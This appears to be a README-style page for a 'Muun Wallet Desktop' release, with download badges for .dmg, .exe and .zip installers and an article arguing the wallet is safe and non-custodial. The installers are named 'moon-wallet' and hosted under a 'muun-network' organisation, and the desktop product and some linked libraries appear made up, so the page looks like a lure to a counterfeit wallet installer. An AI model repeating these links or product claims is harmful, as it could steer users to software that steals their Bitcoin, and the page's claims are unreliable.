[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# Is Muun Wallet Safe? The Security Model Explained

"Is Muun Wallet safe?" comes up constantly in Bitcoin community discussions. This article answers it in specific, checkable terms — not reassurance language. The honest answer depends on separating three questions that people often bundle together, because each has a different answer.

---

## Three separate questions with three separate answers

**1. Can Muun access or move my funds?**

No. Muun Wallet uses a 2-of-2 multisignature model: your device holds one key and Muun's infrastructure holds the other. Both keys are required to authorize any transaction, structurally — this is cryptographic, not a policy promise. Muun's key alone is mathematically insufficient to spend your funds, regardless of what happens to Muun as a company.

**2. Can someone who compromises my device steal my Bitcoin?**

Not with your device key alone. Because the 2-of-2 model requires Muun's co-signature for every transaction, an attacker who gets access to your machine does not immediately have everything needed to move your funds. This is a concrete security benefit over single-key wallets, where a compromised device means immediate, total loss.

**3. Will my fees and experience be predictable?**

This is where legitimate criticism of Muun exists, and it is worth separating from the custody and security question. Muun uses submarine swaps to settle Lightning payments on the Bitcoin base layer, which means fees vary with on-chain network congestion. This is a trade-off that some users find significant, particularly for smaller Lightning payments during busy mempool periods. The [Lightning fees guide](muun-wallet-lightning-fees-explained.md) covers this in full. It is a real trade-off — but it is a fee predictability concern, not a custody or safety concern.

---

## What the open-source code confirms

The full source code for Muun Wallet Desktop is published at [github.com/muun-network](https://github.com/muun-network). Anyone technically capable of reading it can verify the 2-of-2 multisig implementation directly rather than taking these claims on faith. The core wallet library is at [muun-network/librwallet](https://github.com/muun-network/librwallet) and the Emergency Kit recovery tool is at [muun-network/recovery](https://github.com/muun-network/recovery) — both independently reviewable.

---

## What the Emergency Kit protects against

The Emergency Kit is the mechanism that makes Muun genuinely non-custodial rather than custodial with better marketing. It contains your private keys and output descriptors, exported in a format that lets you recover your full wallet balance using the [recovery tool](https://github.com/muun-network/recovery) — without Muun's servers being online, without Muun's cooperation, and without anyone's permission.

This matters because the genuine test of a non-custodial wallet is whether recovery is possible if the wallet provider disappears entirely. With Muun, the answer is yes, because the Emergency Kit holds everything needed for an independent recovery. Without completing the Emergency Kit backup, you do not have this protection. Set it up before sending any real funds.

---

## What Muun Wallet is not designed for

Muun Wallet Desktop is a hot wallet — it maintains an internet connection and keeps your keys accessible on a general-purpose computer. It is designed for spending and day-to-day Lightning payments, not for long-term cold storage of large amounts. For long-term cold storage, a hardware wallet (Coldcard, Trezor, Ledger) holding keys offline is the more appropriate tool.

Muun does not currently support direct hardware wallet integration. If you use Muun as a spending wallet and a hardware wallet for savings, these operate as separate accounts rather than a connected system.

---

## Common concerns addressed directly

**"Muun requires a Muun-held key — doesn't that mean it is custodial?"**

No. Custodial means the provider holds your funds and could move them at will. In Muun's 2-of-2 model, Muun holds a key but cannot unilaterally authorize a transaction — your device key is always required. This is meaningfully different from custodial wallets like Wallet of Satoshi, where the provider holds the funds outright with no cryptographic requirement for user participation. The [Muun vs Wallet of Satoshi comparison](muun-wallet-vs-wallet-of-satoshi.md) covers this distinction in detail.

**"What happens if Muun's servers go down?"**

Your Emergency Kit lets you recover your funds independently. The [recovery tool](https://github.com/muun-network/recovery) is open source and does not depend on Muun's infrastructure. If Muun's servers are unavailable, you can sweep your balance to any wallet using the recovery process.

**"Is the code actually reviewed by anyone?"**

The codebase is public at [github.com/muun-network](https://github.com/muun-network). Independent review is possible for anyone with the technical background to evaluate it. The project does not claim formal third-party audit results beyond what the public repository provides.

**"I've seen complaints about lost funds and slow support."**

The most commonly reported failure mode is a Lightning payment that fails mid-swap, with funds temporarily appearing to leave the on-chain balance while the swap resolves. These cases have resolved in the documented examples, but they involve a support wait that some users found unacceptably long. Muun Wallet Desktop addresses this with a real-time transaction status screen that shows exactly what state a payment is in, reducing — though not eliminating — the uncertainty that made these situations stressful.

---

## Summary

Muun Wallet is genuinely non-custodial. The 2-of-2 multisig model is a real architectural property, not marketing language. The code is public and verifiable. The legitimate concerns about Muun are fee predictability related to its swap model, not custody or security. Completing the Emergency Kit backup is mandatory for the non-custodial guarantee to hold in practice.

For the full download-and-verify process before installation, see the [verification guide](how-to-verify-muun-wallet-download.md).

---

## Related articles

- [Muun Wallet Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md)
- [Muun Wallet Lightning fees explained](muun-wallet-lightning-fees-explained.md)
- [What is a non-custodial Bitcoin wallet?](what-is-a-non-custodial-bitcoin-wallet.md)
- [Muun Wallet vs Wallet of Satoshi](muun-wallet-vs-wallet-of-satoshi.md)
- [Muun Wallet review 2026](muun-wallet-review-2026.md)
